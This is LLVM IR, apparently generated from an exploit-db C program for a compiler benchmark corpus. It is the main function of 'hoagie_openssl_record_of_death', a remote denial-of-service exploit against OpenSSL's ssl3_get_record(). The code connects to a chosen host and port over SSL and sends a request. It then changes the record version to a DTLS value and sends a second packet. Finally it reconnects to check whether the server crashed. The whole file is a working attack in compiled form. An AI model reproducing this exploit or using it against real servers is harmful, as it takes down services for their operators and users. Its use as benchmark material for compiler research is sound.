; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_12334.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_12334.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32 }
%struct.hostent = type { i32 }
%struct.TYPE_5__ = type { i32 }

@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [86 x i8] c"hoagie_openssl_record_of_death.c - openssl ssl3_get_record() remote\0A-andi / void.at\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [8 x i8] c"hd:p:t:\00", align 1
@EOF = common dso_local global i8 0, align 1
@optarg = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [37 x i8] c"[*] destination and/or port missing\0A\00", align 1
@.str.3 = private unnamed_addr constant [25 x i8] c"[*] invalid target '%d'\0A\00", align 1
@.str.4 = private unnamed_addr constant [42 x i8] c"[+] tcp connection to '%s:%d' successful\0A\00", align 1
@.str.5 = private unnamed_addr constant [42 x i8] c"[+] ssl connection to '%s:%d' successful\0A\00", align 1
@.str.6 = private unnamed_addr constant [19 x i8] c"GET / HTTP/1.0\0D\0A\0D\0A\00", align 1
@.str.7 = private unnamed_addr constant [30 x i8] c"[+] sending first packet ...\0A\00", align 1
@DTLS1_BAD_VER = common dso_local global i32 0, align 4
@DTLS1_VERSION = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [30 x i8] c"[+] sending second paket ...\0A\00", align 1
@.str.9 = private unnamed_addr constant [20 x i8] c"[-] exploit failed\0A\00", align 1
@.str.10 = private unnamed_addr constant [24 x i8] c"[+] exploit successful\0A\00", align 1
@.str.11 = private unnamed_addr constant [38 x i8] c"[-] ssl connection to '%s:%d' failed\0A\00", align 1
@.str.12 = private unnamed_addr constant [38 x i8] c"[-] tcp connection to '%s:%d' failed\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca %struct.hostent*, align 8
  %8 = alloca [1024 x i8], align 16
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8, align 1
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca %struct.TYPE_5__*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %10, align 4
  store i8* null, i8** %12, align 8
  store i32 0, i32* %13, align 4
  store %struct.TYPE_5__* null, %struct.TYPE_5__** %14, align 8
  %15 = load i32, i32* @stderr, align 4
  %16 = call i32 (i32, i8*, ...) @fprintf(i32 %15, i8* getelementptr inbounds ([86 x i8], [86 x i8]* @.str, i64 0, i64 0))
  %17 = load i32, i32* %4, align 4
  %18 = icmp slt i32 %17, 2
  br i1 %18, label %19, label %23

19:                                               ; preds = %2
  %20 = load i32, i32* %4, align 4
  %21 = load i8**, i8*** %5, align 8
  %22 = call i32 @usage(i32 %20, i8** %21)
  br label %147

23:                                               ; preds = %2
  br label %24

24:                                               ; preds = %47, %23
  %25 = load i32, i32* %4, align 4
  %26 = load i8**, i8*** %5, align 8
  %27 = call signext i8 @getopt(i32 %25, i8** %26, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0))
  store i8 %27, i8* %11, align 1
  %28 = sext i8 %27 to i32
  %29 = load i8, i8* @EOF, align 1
  %30 = sext i8 %29 to i32
  %31 = icmp ne i32 %28, %30
  br i1 %31, label %32, label %48

32:                                               ; preds = %24
  %33 = load i8, i8* %11, align 1
  %34 = sext i8 %33 to i32
  switch i32 %34, label %47 [
    i32 104, label %35
    i32 100, label %39
    i32 112, label %41
    i32 116, label %44
  ]

35:                                               ; preds = %32
  %36 = load i32, i32* %4, align 4
  %37 = load i8**, i8*** %5, align 8
  %38 = call i32 @usage(i32 %36, i8** %37)
  br label %47

39:                                               ; preds = %32
  %40 = load i8*, i8** @optarg, align 8
  store i8* %40, i8** %12, align 8
  br label %47

41:                                               ; preds = %32
  %42 = load i8*, i8** @optarg, align 8
  %43 = call i32 @atoi(i8* %42)
  store i32 %43, i32* %13, align 4
  br label %47

44:                                               ; preds = %32
  %45 = load i8*, i8** @optarg, align 8
  %46 = call i32 @atoi(i8* %45)
  store i32 %46, i32* %10, align 4
  br label %47

47:                                               ; preds = %32, %44, %41, %39, %35
  br label %24

48:                                               ; preds = %24
  %49 = load i8*, i8** %12, align 8
  %50 = icmp ne i8* %49, null
  br i1 %50, label %51, label %54

51:                                               ; preds = %48
  %52 = load i32, i32* %13, align 4
  %53 = icmp ne i32 %52, 0
  br i1 %53, label %57, label %54

54:                                               ; preds = %51, %48
  %55 = load i32, i32* @stderr, align 4
  %56 = call i32 (i32, i8*, ...) @fprintf(i32 %55, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.2, i64 0, i64 0))
  br label %146

57:                                               ; preds = %51
  %58 = load i32, i32* %10, align 4
  %59 = icmp ne i32 %58, 0
  br i1 %59, label %60, label %67

60:                                               ; preds = %57
  %61 = load i32, i32* %10, align 4
  %62 = icmp ne i32 %61, 1
  br i1 %62, label %63, label %67

63:                                               ; preds = %60
  %64 = load i32, i32* @stderr, align 4
  %65 = load i32, i32* %10, align 4
  %66 = call i32 (i32, i8*, ...) @fprintf(i32 %64, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.3, i64 0, i64 0), i32 %65)
  br label %145

67:                                               ; preds = %60, %57
  %68 = load i8*, i8** %12, align 8
  %69 = load i32, i32* %13, align 4
  %70 = call i32 @connect_to(i8* %68, i32 %69)
  store i32 %70, i32* %9, align 4
  %71 = load i32, i32* %9, align 4
  %72 = icmp sgt i32 %71, 0
  br i1 %72, label %73, label %139

73:                                               ; preds = %67
  %74 = load i32, i32* @stderr, align 4
  %75 = load i8*, i8** %12, align 8
  %76 = load i32, i32* %13, align 4
  %77 = call i32 (i32, i8*, ...) @fprintf(i32 %74, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.4, i64 0, i64 0), i8* %75, i32 %76)
  %78 = load i32, i32* %9, align 4
  %79 = call %struct.TYPE_5__* @ssl_connect_to(i32 %78)
  store %struct.TYPE_5__* %79, %struct.TYPE_5__** %14, align 8
  %80 = load %struct.TYPE_5__*, %struct.TYPE_5__** %14, align 8
  %81 = icmp ne %struct.TYPE_5__* %80, null
  br i1 %81, label %82, label %133

82:                                               ; preds = %73
  %83 = load i32, i32* @stderr, align 4
  %84 = load i8*, i8** %12, align 8
  %85 = load i32, i32* %13, align 4
  %86 = call i32 (i32, i8*, ...) @fprintf(i32 %83, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.5, i64 0, i64 0), i8* %84, i32 %85)
  %87 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %88 = call i32 @snprintf(i8* %87, i32 1024, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.6, i64 0, i64 0))
  %89 = load i32, i32* @stderr, align 4
  %90 = call i32 (i32, i8*, ...) @fprintf(i32 %89, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.7, i64 0, i64 0))
  %91 = load %struct.TYPE_5__*, %struct.TYPE_5__** %14, align 8
  %92 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %93 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %94 = call i32 @strlen(i8* %93)
  %95 = call i32 @SSL_write(%struct.TYPE_5__* %91, i8* %92, i32 %94)
  %96 = load i32, i32* %10, align 4
  %97 = icmp ne i32 %96, 0
  br i1 %97, label %102, label %98

98:                                               ; preds = %82
  %99 = load i32, i32* @DTLS1_BAD_VER, align 4
  %100 = load %struct.TYPE_5__*, %struct.TYPE_5__** %14, align 8
  %101 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %100, i32 0, i32 0
  store i32 %99, i32* %101, align 4
  br label %106

102:                                              ; preds = %82
  %103 = load i32, i32* @DTLS1_VERSION, align 4
  %104 = load %struct.TYPE_5__*, %struct.TYPE_5__** %14, align 8
  %105 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %104, i32 0, i32 0
  store i32 %103, i32* %105, align 4
  br label %106

106:                                              ; preds = %102, %98
  %107 = load i32, i32* @stderr, align 4
  %108 = call i32 (i32, i8*, ...) @fprintf(i32 %107, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.8, i64 0, i64 0))
  %109 = load %struct.TYPE_5__*, %struct.TYPE_5__** %14, align 8
  %110 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %111 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %112 = call i32 @strlen(i8* %111)
  %113 = call i32 @SSL_write(%struct.TYPE_5__* %109, i8* %110, i32 %112)
  %114 = load %struct.TYPE_5__*, %struct.TYPE_5__** %14, align 8
  %115 = call i32 @SSL_shutdown(%struct.TYPE_5__* %114)
  %116 = load i32, i32* %9, align 4
  %117 = call i32 @close(i32 %116)
  %118 = call i32 @sleep(i32 1)
  %119 = load i8*, i8** %12, align 8
  %120 = load i32, i32* %13, align 4
  %121 = call i32 @connect_to(i8* %119, i32 %120)
  store i32 %121, i32* %9, align 4
  %122 = load i32, i32* %9, align 4
  %123 = icmp sgt i32 %122, 0
  br i1 %123, label %124, label %129

124:                                              ; preds = %106
  %125 = load i32, i32* @stderr, align 4
  %126 = call i32 (i32, i8*, ...) @fprintf(i32 %125, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.9, i64 0, i64 0))
  %127 = load i32, i32* %9, align 4
  %128 = call i32 @close(i32 %127)
  br label %132

129:                                              ; preds = %106
  %130 = load i32, i32* @stderr, align 4
  %131 = call i32 (i32, i8*, ...) @fprintf(i32 %130, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.10, i64 0, i64 0))
  br label %132

132:                                              ; preds = %129, %124
  br label %138

133:                                              ; preds = %73
  %134 = load i32, i32* @stderr, align 4
  %135 = load i8*, i8** %12, align 8
  %136 = load i32, i32* %13, align 4
  %137 = call i32 (i32, i8*, ...) @fprintf(i32 %134, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.11, i64 0, i64 0), i8* %135, i32 %136)
  br label %138

138:                                              ; preds = %133, %132
  br label %144

139:                                              ; preds = %67
  %140 = load i32, i32* @stderr, align 4
  %141 = load i8*, i8** %12, align 8
  %142 = load i32, i32* %13, align 4
  %143 = call i32 (i32, i8*, ...) @fprintf(i32 %140, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.12, i64 0, i64 0), i8* %141, i32 %142)
  br label %144

144:                                              ; preds = %139, %138
  br label %145

145:                                              ; preds = %144, %63
  br label %146

146:                                              ; preds = %145, %54
  br label %147

147:                                              ; preds = %146, %19
  ret i32 0
}

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i32 @usage(i32, i8**) #1

declare dso_local signext i8 @getopt(i32, i8**, i8*) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @connect_to(i8*, i32) #1

declare dso_local %struct.TYPE_5__* @ssl_connect_to(i32) #1

declare dso_local i32 @snprintf(i8*, i32, i8*) #1

declare dso_local i32 @SSL_write(%struct.TYPE_5__*, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @SSL_shutdown(%struct.TYPE_5__*) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @sleep(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
